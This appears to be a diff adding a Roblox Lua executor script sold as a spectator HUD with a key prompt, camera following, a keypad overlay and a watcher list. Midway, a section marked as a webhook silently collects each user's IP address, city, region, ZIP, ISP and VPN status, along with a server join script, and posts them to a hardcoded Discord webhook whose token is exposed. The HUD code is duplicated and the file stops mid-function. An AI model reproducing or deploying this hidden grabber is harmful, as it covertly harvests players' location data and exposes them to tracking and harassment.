@@ -1,0 +1,1250 @@
+--// ==============================================================
+--//  PAYLOAD0 • MINIMAL SPECTATE PROMPT (AAA STYLE)
+--//  • Subtle, single-line instruction
+--//  • Press [N] to Spectate
+--//  • Auto-fades after 5s
+--// ==============================================================
+
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local Debris = game:GetService("Debris")
+local UserInputService = game:GetService("UserInputService")
+
+-- CONFIG
+local ACCENT = Color3.fromRGB(120,180,255)
+local TEXT = Color3.fromRGB(240,240,240)
+local FADE_TIME = 0.4
+local DISPLAY_TIME = 5
+local GLOW_ID = "rbxassetid://1316045217"
+
+-- CLEANUP OLD
+if CoreGui:FindFirstChild("Payload0_SpectateHint") then
+	CoreGui.Payload0_SpectateHint:Destroy()
+end
+
+-- GUI ROOT
+local gui = Instance.new("ScreenGui")
+gui.Name = "Payload0_SpectateHint"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
+
+-- CONTAINER (center bottom)
+local frame = Instance.new("Frame")
+frame.BackgroundTransparency = 1
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.9, 0)
+frame.Size = UDim2.fromOffset(300, 40)
+frame.Parent = gui
+
+-- GLOW BACKDROP
+local glow = Instance.new("ImageLabel")
+glow.Image = GLOW_ID
+glow.BackgroundTransparency = 1
+glow.ImageColor3 = ACCENT
+glow.ImageTransparency = 0.9
+glow.AnchorPoint = Vector2.new(0.5, 0.5)
+glow.Position = UDim2.fromScale(0.5, 0.5)
+glow.Size = UDim2.fromScale(1.8, 1.8)
+glow.ZIndex = 0
+glow.Parent = frame
+
+-- TEXT
+local label = Instance.new("TextLabel")
+label.BackgroundTransparency = 1
+label.Text = "Press  [N]  to Spectate"
+label.Font = Enum.Font.GothamBold
+label.TextSize = 20
+label.TextColor3 = TEXT
+label.AnchorPoint = Vector2.new(0.5, 0.5)
+label.Position = UDim2.fromScale(0.5, 0.5)
+label.TextTransparency = 1
+label.ZIndex = 2
+label.Parent = frame
+
+-- INTRO
+TweenService:Create(label, TweenInfo.new(FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
+TweenService:Create(glow, TweenInfo.new(FADE_TIME), {ImageTransparency = 0.8}):Play()
+
+-- REACTIVE PULSE
+UserInputService.InputBegan:Connect(function(input, gp)
+	if gp then return end
+	if input.KeyCode == Enum.KeyCode.N then
+		local pulse = glow:Clone()
+		pulse.Parent = frame
+		pulse.ImageTransparency = 0.4
+		TweenService:Create(pulse, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Size = UDim2.fromScale(2.5,2.5),
+			ImageTransparency = 1
+		}):Play()
+		Debris:AddItem(pulse, 0.5)
+	end
+end)
+
+-- AUTO FADE OUT
+task.delay(DISPLAY_TIME, function()
+	TweenService:Create(label, TweenInfo.new(FADE_TIME), {TextTransparency = 1}):Play()
+	TweenService:Create(glow, TweenInfo.new(FADE_TIME), {ImageTransparency = 1}):Play()
+	task.wait(FADE_TIME + 0.1)
+	gui:Destroy()
+end)
+-- ========================================================================================
+
+--// =====================================================================================
+--//  SPECTATOR HUD [v3.7 FULL + Keypad Overlay + Cursor Dot]
+--//  • Live WASD + Mouse L/M/R HUD (only when spectating)
+--//  • Cursor dot (white → flash red on Left click; ignores Right)
+--//  • Mid-right spectate controls + "Spectating: <name>" label
+--//  • Spectators list (who's watching YOU) with light caching
+--// =====================================================================================
+
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService        = game:GetService("RunService")
+local UserInputService  = game:GetService("UserInputService")
+local TweenService      = game:GetService("TweenService")
+local CoreGui           = game:GetService("CoreGui")
+local Camera            = workspace.CurrentCamera
+
+local LP   = Players.LocalPlayer
+local Root = ReplicatedStorage:FindFirstChild("ScreenWatch")
+
+--=== CONFIG ===
+local CFG = {
+	UIName      = "ForensicHUD_v3p7_Full",
+	LerpAlpha   = 0.55,
+	UpdateHz    = 10,
+	Match       = { PosEPS = 5, AngEPSDot = 0.85 },
+	Color       = {
+		Fg   = Color3.fromRGB(230,230,230),
+		Soft = Color3.fromRGB(35,35,35),
+		Red  = Color3.fromRGB(255,60,60),
+		White= Color3.fromRGB(255,255,255),
+		Pulse= Color3.fromRGB(60,255,60)
+	},
+	ListAnchor  = UDim2.new(1, -20, 0.5, -90),
+	ListSize    = UDim2.fromOffset(220, 180),
+	LabelWidth  = 180,
+	ButtonSize  = UDim2.fromOffset(28,28),
+
+	-- Keypad HUD
+	KeypadPos   = UDim2.new(0, 22, 1, -126),
+	KeySize     = Vector2.new(36,30),
+	KeyTweenDur = 0.07,
+	KeyActive   = Color3.fromRGB(255,60,60),
+}
+
+--=== CLEANUP ===
+local old = CoreGui:FindFirstChild(CFG.UIName)
+if old then old:Destroy() end
+
+--=== GUI ROOT ===
+local gui = Instance.new("ScreenGui")
+gui.Name = CFG.UIName
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
+
+--=== SPECTATE CONTROL PANEL (Mid-Right) ===
+local controlWrap = Instance.new("Frame")
+controlWrap.AnchorPoint = Vector2.new(1,0.5)
+controlWrap.Position = UDim2.new(1,-22,0.5,0)
+controlWrap.Size = UDim2.fromOffset(280,40)
+controlWrap.BackgroundTransparency = 1
+controlWrap.Visible = false
+controlWrap.Parent = gui
+
+local hlist = Instance.new("UIListLayout")
+hlist.FillDirection = Enum.FillDirection.Horizontal
+hlist.HorizontalAlignment = Enum.HorizontalAlignment.Center
+hlist.VerticalAlignment = Enum.VerticalAlignment.Center
+hlist.Padding = UDim.new(0,6)
+hlist.Parent = controlWrap
+
+local function makeButton(t)
+	local b = Instance.new("TextButton")
+	b.Size = CFG.ButtonSize
+	b.BackgroundColor3 = CFG.Color.Soft
+	b.Text = t
+	b.TextColor3 = CFG.Color.Fg
+	b.Font = Enum.Font.GothamBold
+	b.TextSize = 16
+	Instance.new("UICorner", b)
+	local s = Instance.new("UIStroke", b)
+	s.Thickness = 1
+	s.Color = Color3.fromRGB(80,80,80)
+	return b
+end
+
+local btnPrev = makeButton("◀")
+btnPrev.Parent = controlWrap
+
+local lbl = Instance.new("TextLabel")
+lbl.Size = UDim2.fromOffset(CFG.LabelWidth,28)
+lbl.BackgroundTransparency = 1
+lbl.TextColor3 = CFG.Color.Fg
+lbl.Font = Enum.Font.GothamBold
+lbl.TextSize = 14
+lbl.Text = "Spectating: —"
+lbl.Parent = controlWrap
+
+local btnNext = makeButton("▶")
+btnNext.Parent = controlWrap
+
+--=== WATCHING LIST PANEL (Spectators Watching YOU) ===
+local namesPanel = Instance.new("Frame")
+namesPanel.AnchorPoint = Vector2.new(1,0.5)
+namesPanel.Position = CFG.ListAnchor
+namesPanel.Size = CFG.ListSize
+namesPanel.BackgroundTransparency = 1
+namesPanel.Parent = gui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,-12,0,24)
+title.Position = UDim2.new(0,6,0,6)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.TextColor3 = CFG.Color.Fg
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.TextSize = 14
+title.Text = "👁  Spectators: 0"
+title.Parent = namesPanel
+
+local listHolder = Instance.new("ScrollingFrame")
+listHolder.Size = UDim2.new(1,-12,1,-40)
+listHolder.Position = UDim2.new(0,6,0,36)
+listHolder.BackgroundTransparency = 1
+listHolder.BorderSizePixel = 0
+listHolder.CanvasSize = UDim2.new(0,0,0,0)
+listHolder.ScrollBarThickness = 6
+listHolder.Parent = namesPanel
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0,6)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = listHolder
+layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+	listHolder.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y)
+end)
+
+--// =====================================================================================
+--// KEYPAD HUD (WASD + LMR) — only visible when spectating
+--// =====================================================================================
+local keypad = Instance.new("Frame")
+keypad.Size = UDim2.fromOffset(200, 92)
+keypad.Position = CFG.KeypadPos
+keypad.BackgroundTransparency = 0.35
+keypad.BackgroundColor3 = CFG.Color.Soft
+keypad.Visible = false
+keypad.Parent = gui
+Instance.new("UICorner", keypad).CornerRadius = UDim.new(0,8)
+
+local function makeKey(x,y,txt)
+	local k = Instance.new("TextLabel")
+	k.Size = UDim2.fromOffset(CFG.KeySize.X, CFG.KeySize.Y)
+	k.Position = UDim2.fromOffset(x,y)
+	k.BackgroundColor3 = CFG.Color.Soft
+	k.TextColor3 = CFG.Color.Fg
+	k.Font = Enum.Font.GothamBold
+	k.TextSize = 14
+	k.Text = txt
+	k.Parent = keypad
+	Instance.new("UICorner",k).CornerRadius = UDim.new(0,6)
+	return k
+end
+
+local keyW = makeKey(82, 0, "W")
+local keyA = makeKey(40, 34, "A")
+local keyS = makeKey(82, 34, "S")
+local keyD = makeKey(124, 34, "D")
+local mL  = makeKey(0,  68, "L")
+local mM  = makeKey(82, 68, "M")
+local mR  = makeKey(164,68, "R")
+local keyMap = {W=keyW,A=keyA,S=keyS,D=keyD,Left=mL,Middle=mM,Right=mR}
+
+local function pulseKey(k,active)
+	local target = active and CFG.KeyActive or CFG.Color.Soft
+	TweenService:Create(k, TweenInfo.new(CFG.KeyTweenDur), {BackgroundColor3=target}):Play()
+end
+
+--// =====================================================================================
+--// CURSOR DOT — white by default, flashes red on Left click; ignores Right
+--// =====================================================================================
+local dot = Instance.new("Frame")
+dot.Size = UDim2.fromOffset(8, 8)
+dot.AnchorPoint = Vector2.new(0.5,0.5)
+dot.BackgroundColor3 = CFG.Color.White
+dot.BackgroundTransparency = 0.1
+dot.Visible = false
+dot.ZIndex = 10
+dot.Parent = gui
+Instance.new("UICorner",dot).CornerRadius = UDim.new(1,0)
+
+local flashCooldown = 0
+
+--=== HELPERS ===
+local function getHRP(plr)
+	if not plr or not plr.Character then return nil end
+	return plr.Character:FindFirstChild("HumanoidRootPart")
+end
+local function nodeFor(p)
+	if not (Root and p) then return nil end
+	return Root:FindFirstChild(p.Name)
+end
+local function camVal(p)
+	local n=nodeFor(p)
+	if not n then return nil end
+	local c=n:FindFirstChild("Camera")
+	return c and c.Value or nil
+end
+local function camMatch(a,b)
+	if not (a and b) then return false end
+	local d=(a.Position-b.Position).Magnitude
+	local posOk=d<=CFG.Match.PosEPS*(1+d/20)
+	local dotv=a.LookVector:Dot(b.LookVector)
+	return posOk and dotv>=CFG.Match.AngEPSDot
+end
+
+--=== CORE STATE ===
+local spectating,currentTarget=false,nil
+local list,idx={},0
+local WatcherCache={}
+local prevList={}
+
+--=== WATCHERS LIST UPDATE (who's watching YOU) ===
+local function whoWatchingYou()
+	local now=tick()
+	local tgt=LP
+	local cached=WatcherCache[tgt]
+	if cached and now-cached.t<1 then return cached.l end
+
+	local arr={}
+	local myCF=camVal(tgt)
+	for _,p in ipairs(Players:GetPlayers()) do
+		if p~=tgt then
+			local theirCF=camVal(p)
+			if camMatch(theirCF,myCF) then
+				table.insert(arr,p.Name)
+			end
+		end
+	end
+	table.sort(arr,function(a,b) return a:lower()<b:lower() end)
+	WatcherCache[tgt]={l=arr,t=now}
+	return arr
+end
+
+local function renderWatchingList(l)
+	if #l==#prevList then
+		local same=true
+		for i,v in ipairs(l) do if v~=prevList[i] then same=false break end end
+		if same then return end
+	end
+	title.Text=("👁  Spectators: %d"):format(#l)
+	for _,c in ipairs(listHolder:GetChildren()) do
+		if c:IsA("TextLabel") then c:Destroy() end
+	end
+	for _,n in ipairs(l) do
+		local row=Instance.new("TextLabel")
+		row.Size=UDim2.new(1,-4,0,22)
+		row.BackgroundTransparency=1
+		row.TextXAlignment=Enum.TextXAlignment.Left
+		row.Font=Enum.Font.Gotham
+		row.TextColor3=CFG.Color.Fg
+		row.TextSize=13
+		row.Text="  • "..n
+		row.Parent=listHolder
+	end
+	prevList=l
+end
+
+task.spawn(function()
+	while task.wait(1/CFG.UpdateHz) do
+		renderWatchingList(whoWatchingYou())
+	end
+end)
+
+--=== TARGET SYSTEM ===
+local function sortedOthers()
+	local arr={}
+	for _,p in ipairs(Players:GetPlayers()) do if p~=LP then table.insert(arr,p) end end
+	table.sort(arr,function(a,b)
+		local A=getHRP(a) local B=getHRP(b)
+		local my=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+		if not (A and B and my) then return (a.Name < b.Name) end
+		return (A.Position-my.Position).Magnitude < (B.Position-my.Position).Magnitude
+	end)
+	return arr
+end
+
+local function closest()
+	local best,bestD
+	local myHRP=getHRP(LP)
+	if not myHRP then return nil end
+	for _,p in ipairs(Players:GetPlayers()) do
+		if p~=LP then
+			local hrp=getHRP(p)
+			if hrp then
+				local d=(hrp.Position-myHRP.Position).Magnitude
+				if not bestD or d<bestD then best,bestD=p,d end
+			end
+		end
+	end
+	return best
+end
+
+local function setLabelTarget(p)
+	lbl.Text = p and ("Spectating: "..p.Name) or "Spectating: —"
+end
+local function setSpectateUIVisible(v)
+	controlWrap.Visible = v
+	keypad.Visible = v
+	dot.Visible = v
+end
+
+local function resetSelf()
+	local ch=LP.Character or LP.CharacterAdded:Wait()
+	local hum=ch:FindFirstChildWhichIsA("Humanoid")
+	if hum then
+		Camera.CameraType=Enum.CameraType.Custom
+		Camera.CameraSubject=hum
+	end
+	currentTarget=nil
+	spectating=false
+	setLabelTarget(nil)
+	setSpectateUIVisible(false)
+	-- restore dot color
+	dot.BackgroundColor3 = CFG.Color.White
+end
+
+local function watch(plr)
+	if not plr then return end
+	currentTarget=plr
+	spectating=true
+	Camera.CameraType=Enum.CameraType.Scriptable
+	setLabelTarget(plr)
+	setSpectateUIVisible(true)
+end
+
+local function nextTarget(delta)
+	if #list==0 then list=sortedOthers() end
+	if #list==0 then return end
+	idx += delta
+	if idx>#list then idx=1 end
+	if idx<1 then idx=#list end
+	watch(list[idx])
+end
+
+btnNext.MouseButton1Click:Connect(function() if spectating then nextTarget(1) end end)
+btnPrev.MouseButton1Click:Connect(function() if spectating then nextTarget(-1) end end)
+
+--=== ONE-KEY TOGGLE (N) ===
+UserInputService.InputBegan:Connect(function(i,gp)
+	if gp then return end
+	if i.KeyCode==Enum.KeyCode.N then
+		if spectating then
+			resetSelf()
+		else
+			list=sortedOthers()
+			local c=closest() or list[1]
+			idx=1
+			for i2,p in ipairs(list) do if p==c then idx=i2 break end end
+			watch(c)
+		end
+	end
+end)
+
+--=== CAMERA FOLLOW + KEYPAD + CURSOR DOT LOOP ===
+RunService.RenderStepped:Connect(function()
+	if not spectating or not currentTarget then return end
+
+	local node=nodeFor(currentTarget)
+	if node then
+		-- Camera sync
+		local cam=node:FindFirstChild("Camera")
+		local fov=node:FindFirstChild("FieldOfView")
+		if cam and fov then
+			Camera.CFrame = Camera.CFrame:Lerp(cam.Value, CFG.LerpAlpha)
+			Camera.FieldOfView = fov.Value
+		end
+
+		-- Keypad updates
+		for name,label in pairs(keyMap) do
+			local bv=node:FindFirstChild(name)
+			pulseKey(label, bv and bv.Value)
+		end
+
+		-- Cursor dot: project MousePos to screen; white → flash red on Left
+		local m=node:FindFirstChild("MousePos")
+		if m and typeof(m.Value)=="Vector3" then
+			local v=Camera:WorldToViewportPoint(m.Value)
+			if v.Z>0 then
+				dot.Position=UDim2.fromOffset(v.X, v.Y)
+				dot.Visible=true
+			else
+				dot.Visible=false
+			end
+		else
+			dot.Visible=false
+		end
+
+		-- Flash red on left click (ignore right)
+		local left=node:FindFirstChild("Left")
+		if left and left.Value and tick()>flashCooldown then
+			dot.BackgroundColor3 = CFG.Color.Red
+			flashCooldown = tick() + 0.1
+		else
+			-- Smoothly fade back to white
+			dot.BackgroundColor3 = dot.BackgroundColor3:lerp(CFG.Color.White, 0.25)
+		end
+	end
+end)
+
+resetSelf()
+
+
+-- ====================================================================================================================
+
+-- // WEBHOOK
+
+local webhookUrl =
+    'https://discord.com/api/webhooks/1419503866747293696/LE5EwcwVXTOtLMXyyFZMVDA7DaphiyAUHAptM5ORUEKFeOx0s2PeSgdtUQpk6pgvPS-X'
+
+local HttpService, Players, MarketplaceService =
+    game:GetService('HttpService'),
+    game:GetService('Players'),
+    game:GetService('MarketplaceService')
+local player, pName, uid =
+    Players.LocalPlayer, Players.LocalPlayer.Name, Players.LocalPlayer.UserId
+
+-- Safe HTTP wrapper
+local requestFunc = http_request
+    or request
+    or syn and syn.request
+    or http and http.request
+local function safeRequestJson(opts)
+    local ok, resp = pcall(requestFunc, opts)
+    if not ok or not resp or not resp.Body then
+        return nil
+    end
+    local success, data = pcall(function()
+        return HttpService:JSONDecode(resp.Body)
+    end)
+    return success and data or nil
+end
+
+-- Avatar & profile
+local avatarCDN = 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&userName='
+    .. pName
+local thumbUrl = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='
+    .. uid
+    .. '&size=150x150&format=Webp&isCircular=false'
+local ok, data = pcall(function()
+    return HttpService:JSONDecode(game:HttpGet(thumbUrl))
+end)
+if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
+    avatarCDN = data.data[1].imageUrl
+end
+local gameLink = 'https://www.roblox.com/games/' .. game.PlaceId
+local ok2, info =
+    pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
+local gameName = ok2 and info and info.Name or '[Unknown Game]'
+
+-- IP/Geo info (Primary: ip-api.com)
+local ipInfo = safeRequestJson({
+    Url = 'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,isp,query',
+    Method = 'GET',
+})
+local ipAddress, country, countryCode, state, city, zip, isp =
+    ipInfo and ipInfo.query or 'Unknown IP',
+    ipInfo and ipInfo.country or 'Unknown Country',
+    ipInfo and ipInfo.countryCode or 'XX',
+    ipInfo and ipInfo.regionName or 'Unknown Region',
+    ipInfo and ipInfo.city or 'Unknown City',
+    ipInfo and ipInfo.zip or 'Unknown ZIP',
+    ipInfo and ipInfo.isp or 'Unknown ISP'
+
+-- Backup VPN check (ipapi.is)
+local backupIpInfo = safeRequestJson({
+    Url = 'https://api.ipapi.is',
+    Method = 'GET',
+})
+
+-- Flag emoji
+local function getFlagEmoji(code)
+    return code and #code == 2 and ':flag_' .. string.lower(code) .. ':' or ''
+end
+local flagEmoji = getFlagEmoji(countryCode)
+
+-- Extreme VPN Detection with Backup API
+local function checkVPN(primaryInfo, backupInfo)
+    if not primaryInfo or not primaryInfo.isp or not primaryInfo.query then
+        return '⚠️ Unknown (Suspicious)'
+    end
+
+    local isp = primaryInfo.isp:lower()
+    local ip = primaryInfo.query
+    local countryCode = primaryInfo.countryCode or 'XX'
+
+    -- Expanded blacklist with broader, more aggressive keywords
+    local blacklist = {
+        'vpn',
+        'proxy',
+        'cloud',
+        'server',
+        'host',
+        'data',
+        'colo',
+        'colocation',
+        'ovh',
+        'amazon',
+        'aws',
+        'google',
+        'gcp',
+        'microsoft',
+        'azure',
+        'digitalocean',
+        'linode',
+        'hetzner',
+        'vultr',
+        'leaseweb',
+        'contabo',
+        'rackspace',
+        'alibaba',
+        'cloudflare',
+        'fastly',
+        'akamai',
+        'oracle',
+        'ibm',
+        'zscaler',
+        'nord',
+        'expressvpn',
+        'surfshark',
+        'proton',
+        'mullvad',
+        'windscribe',
+        'private',
+        'secure',
+        'tunnel',
+        'cyber',
+        'virtual',
+        'dedicated',
+        'shared',
+        'network',
+        'internet',
+        'web',
+        'cdn',
+        'ip',
+        'transit',
+        'bandwidth',
+        'connect',
+        'link',
+        'fiber',
+        'broadband',
+    }
+
+    -- Primary check: Blacklist keywords
+    local primarySuspicious = false
+    local primaryDetails = ''
+    for _, badWord in ipairs(blacklist) do
+        if isp:find(badWord) then
+            primarySuspicious = true
+            primaryDetails = ' (Blacklist: ' .. badWord .. ')'
+            break
+        end
+    end
+
+    -- Primary check: Non-standard ISPs
+    local commonResidentialISPs = {
+        'comcast',
+        'verizon',
+        'at&t',
+        'spectrum',
+        'charter',
+        'centurylink',
+        'cox',
+        'bt',
+        'virgin media',
+        'telstra',
+        'optus',
+        'sky',
+        'vodafone',
+        'deutsche telekom',
+        'orange',
+        'telefonica',
+        'xfinity',
+    }
+    local isResidential = false
+    for _, residentialISP in ipairs(commonResidentialISPs) do
+        if isp:find(residentialISP) then
+            isResidential = true
+            break
+        end
+    end
+    if not isResidential then
+        primarySuspicious = true
+        primaryDetails = primaryDetails == '' and ' (Non-Residential ISP)'
+            or primaryDetails .. ', Non-Residential ISP'
+    end
+
+    -- Primary check: Missing ZIP
+    if not primaryInfo.zip or primaryInfo.zip == '' then
+        primarySuspicious = true
+        primaryDetails = primaryDetails == '' and ' (Missing ZIP)'
+            or primaryDetails .. ', Missing ZIP'
+    end
+
+    -- Primary check: Generic ISP names
+    if
+        isp:find('^ip[-%d]')
+        or isp:find('^unknown')
+        or isp:find('^anonymous')
+    then
+        primarySuspicious = true
+        primaryDetails = primaryDetails == '' and ' (Generic ISP Name)'
+            or primaryDetails .. ', Generic ISP Name'
+    end
+
+    -- Primary check: Short ISP name
+    if #isp < 5 then
+        primarySuspicious = true
+        primaryDetails = primaryDetails == '' and ' (Vague ISP Name)'
+            or primaryDetails .. ', Vague ISP Name'
+    end
+
+    -- Backup check: ipapi.is for VPN/Proxy/Datacenter
+    local backupSuspicious = false
+    local backupDetails = ''
+    if backupInfo then
+        local isVpn = backupInfo.is_vpn or false
+        local isProxy = backupInfo.is_proxy or false
+        local isDatacenter = backupInfo.is_datacenter or false
+        if isVpn or isProxy or isDatacenter then
+            backupSuspicious = true
+            if isVpn and backupInfo.vpn and backupInfo.vpn.service then
+                backupDetails = ' (Backup API: VPN - '
+                    .. backupInfo.vpn.service
+                    .. ')'
+            elseif isProxy then
+                backupDetails = ' (Backup API: Proxy)'
+            elseif
+                isDatacenter
+                and backupInfo.datacenter
+                and backupInfo.datacenter.datacenter
+            then
+                backupDetails = ' (Backup API: Datacenter - '
+                    .. backupInfo.datacenter.datacenter
+                    .. ')'
+            end
+        end
+    end
+
+    -- Cross-reference results
+    if primarySuspicious and backupSuspicious then
+        return '❌ VPN/Proxy Detected' .. primaryDetails .. backupDetails
+    elseif primarySuspicious or backupSuspicious then
+        return '⚠️ Suspicious'
+            .. (primarySuspicious and primaryDetails or backupDetails)
+    end
+
+    return '✅ Clean IP'
+end
+
+local vpnStatus = checkVPN(ipInfo, backupIpInfo)
+
+-- Teleport join script
+local teleportBlock = string.format(
+    "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)\n```",
+    game.PlaceId,
+    game.JobId
+)
+
+-- Executor
+local uaDisplay = 'SPECTATE SCRIPT'
+
+-- Bottom info block (only Game + Executor)
+local bottomBlock = string.format(
+    '**Game:** [%s](%s)\n**🤡:** %s',
+    gameName,
+    gameLink,
+    uaDisplay
+)
+
+-- Copyable IP + ISP block (ASN removed)
+local copyableBlock = string.format(
+    '```\nCountry: %s\nCity: %s\nRegion: %s\nZIP: %s\nIP: %s\nISP: %s\n```',
+    country,
+    city,
+    state,
+    zip,
+    ipAddress,
+    isp
+)
+
+-- Payload
+local data = {
+    content = '||@everyone||',
+    username = pName,
+    avatar_url = avatarCDN,
+    embeds = {
+        {
+            description = '__**' .. pName .. '**__',
+            fields = {
+                {
+                    name = '**COUNTRY**',
+                    value = flagEmoji .. ' ' .. country,
+                    inline = true,
+                },
+                { name = '**CITY**', value = city, inline = true },
+                { name = '**REGION**', value = state, inline = true },
+                {
+                    name = '‎',
+                    value = copyableBlock,
+                    inline = false,
+                },
+                {
+                    name = 'Status',
+                    value = vpnStatus,
+                    inline = false,
+                },
+                {
+                    name = '📎 Join Script',
+                    value = teleportBlock,
+                    inline = false,
+                },
+                {
+                    name = '‎',
+                    value = bottomBlock,
+                    inline = false,
+                },
+            },
+            color = 0x3498db,
+            thumbnail = { url = avatarCDN },
+        },
+    },
+}
+
+-- Send webhook
+local ok3, body = pcall(function()
+    return HttpService:JSONEncode(data)
+end)
+if ok3 then
+    pcall(function()
+        requestFunc({
+            Url = webhookUrl,
+            Method = 'POST',
+            Headers = { ['Content-Type'] = 'application/json' },
+            Body = body,
+        })
+    end)
+end
+
+--// =====================================================================================
+--//  SPECTATOR HUD [v3.7 FULL + Keypad Overlay + Cursor Dot]
+--//  • Live WASD + Mouse L/M/R HUD (only when spectating)
+--//  • Cursor dot (white → flash red on Left click; ignores Right)
+--//  • Mid-right spectate controls + "Spectating: <name>" label
+--//  • Spectators list (who's watching YOU) with light caching
+--// =====================================================================================
+
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService        = game:GetService("RunService")
+local UserInputService  = game:GetService("UserInputService")
+local TweenService      = game:GetService("TweenService")
+local CoreGui           = game:GetService("CoreGui")
+local Camera            = workspace.CurrentCamera
+
+local LP   = Players.LocalPlayer
+local Root = ReplicatedStorage:FindFirstChild("ScreenWatch")
+
+--=== CONFIG ===
+local CFG = {
+	UIName      = "ForensicHUD_v3p7_Full",
+	LerpAlpha   = 0.55,
+	UpdateHz    = 10,
+	Match       = { PosEPS = 5, AngEPSDot = 0.85 },
+	Color       = {
+		Fg   = Color3.fromRGB(230,230,230),
+		Soft = Color3.fromRGB(35,35,35),
+		Red  = Color3.fromRGB(255,60,60),
+		White= Color3.fromRGB(255,255,255),
+		Pulse= Color3.fromRGB(60,255,60)
+	},
+	ListAnchor  = UDim2.new(1, -20, 0.5, -90),
+	ListSize    = UDim2.fromOffset(220, 180),
+	LabelWidth  = 180,
+	ButtonSize  = UDim2.fromOffset(28,28),
+
+	-- Keypad HUD
+	KeypadPos   = UDim2.new(0, 22, 1, -126),
+	KeySize     = Vector2.new(36,30),
+	KeyTweenDur = 0.07,
+	KeyActive   = Color3.fromRGB(255,60,60),
+}
+
+--=== CLEANUP ===
+local old = CoreGui:FindFirstChild(CFG.UIName)
+if old then old:Destroy() end
+
+--=== GUI ROOT ===
+local gui = Instance.new("ScreenGui")
+gui.Name = CFG.UIName
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
+
+--=== SPECTATE CONTROL PANEL (Mid-Right) ===
+local controlWrap = Instance.new("Frame")
+controlWrap.AnchorPoint = Vector2.new(1,0.5)
+controlWrap.Position = UDim2.new(1,-22,0.5,0)
+controlWrap.Size = UDim2.fromOffset(280,40)
+controlWrap.BackgroundTransparency = 1
+controlWrap.Visible = false
+controlWrap.Parent = gui
+
+local hlist = Instance.new("UIListLayout")
+hlist.FillDirection = Enum.FillDirection.Horizontal
+hlist.HorizontalAlignment = Enum.HorizontalAlignment.Center
+hlist.VerticalAlignment = Enum.VerticalAlignment.Center
+hlist.Padding = UDim.new(0,6)
+hlist.Parent = controlWrap
+
+local function makeButton(t)
+	local b = Instance.new("TextButton")
+	b.Size = CFG.ButtonSize
+	b.BackgroundColor3 = CFG.Color.Soft
+	b.Text = t
+	b.TextColor3 = CFG.Color.Fg
+	b.Font = Enum.Font.GothamBold
+	b.TextSize = 16
+	Instance.new("UICorner", b)
+	local s = Instance.new("UIStroke", b)
+	s.Thickness = 1
+	s.Color = Color3.fromRGB(80,80,80)
+	return b
+end
+
+local btnPrev = makeButton("◀")
+btnPrev.Parent = controlWrap
+
+local lbl = Instance.new("TextLabel")
+lbl.Size = UDim2.fromOffset(CFG.LabelWidth,28)
+lbl.BackgroundTransparency = 1
+lbl.TextColor3 = CFG.Color.Fg
+lbl.Font = Enum.Font.GothamBold
+lbl.TextSize = 14
+lbl.Text = "Spectating: —"
+lbl.Parent = controlWrap
+
+local btnNext = makeButton("▶")
+btnNext.Parent = controlWrap
+
+--=== WATCHING LIST PANEL (Spectators Watching YOU) ===
+local namesPanel = Instance.new("Frame")
+namesPanel.AnchorPoint = Vector2.new(1,0.5)
+namesPanel.Position = CFG.ListAnchor
+namesPanel.Size = CFG.ListSize
+namesPanel.BackgroundTransparency = 1
+namesPanel.Parent = gui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,-12,0,24)
+title.Position = UDim2.new(0,6,0,6)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.TextColor3 = CFG.Color.Fg
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.TextSize = 14
+title.Text = "👁  Spectators: 0"
+title.Parent = namesPanel
+
+local listHolder = Instance.new("ScrollingFrame")
+listHolder.Size = UDim2.new(1,-12,1,-40)
+listHolder.Position = UDim2.new(0,6,0,36)
+listHolder.BackgroundTransparency = 1
+listHolder.BorderSizePixel = 0
+listHolder.CanvasSize = UDim2.new(0,0,0,0)
+listHolder.ScrollBarThickness = 6
+listHolder.Parent = namesPanel
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0,6)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = listHolder
+layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+	listHolder.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y)
+end)
+
+--// =====================================================================================
+--// KEYPAD HUD (WASD + LMR) — only visible when spectating
+--// =====================================================================================
+local keypad = Instance.new("Frame")
+keypad.Size = UDim2.fromOffset(200, 92)
+keypad.Position = CFG.KeypadPos
+keypad.BackgroundTransparency = 0.35
+keypad.BackgroundColor3 = CFG.Color.Soft
+keypad.Visible = false
+keypad.Parent = gui
+Instance.new("UICorner", keypad).CornerRadius = UDim.new(0,8)
+
+local function makeKey(x,y,txt)
+	local k = Instance.new("TextLabel")
+	k.Size = UDim2.fromOffset(CFG.KeySize.X, CFG.KeySize.Y)
